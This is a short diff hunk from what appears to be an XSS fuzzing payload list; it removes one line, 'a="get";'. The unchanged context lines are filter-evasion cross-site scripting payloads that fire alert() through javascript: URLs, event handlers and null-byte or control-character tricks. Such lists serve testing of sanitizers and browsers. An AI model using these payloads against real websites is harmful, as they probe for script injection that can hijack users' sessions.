@@ -53,7 +53,6 @@ ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
 <BGSOUND SRC="javascript:alert('XSS');">
 <script>/* *\x2A/javascript:alert(1)// */</script>
 <a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
-a="get";
 <SELECT NAME="" onmouseover=alert(123)></select>
 <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
 <img src\x00=x onerror="javascript:alert(1)">
